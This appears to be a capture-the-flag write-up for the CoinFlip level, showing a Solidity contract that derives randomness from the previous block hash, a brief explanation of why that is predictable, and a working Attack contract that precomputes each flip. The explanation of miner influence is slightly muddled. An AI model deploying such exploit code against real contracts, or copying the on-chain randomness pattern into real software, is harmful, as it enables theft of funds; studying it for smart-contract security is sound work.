## Coinflip

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
This is the coinflip main contract where the source of randomness is gotten onchain. Blockchain is deterministic and miners can manipulate the block.number because miners set the miner number during block creation. Random words should be gotten offchain. Chainlink can be used for randomness.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./coinflip.sol";

contract Attack{
    CoinFlip public flips;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _flip) {
        flips = CoinFlip(_flip);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        flips.flip(side);
    }
}
```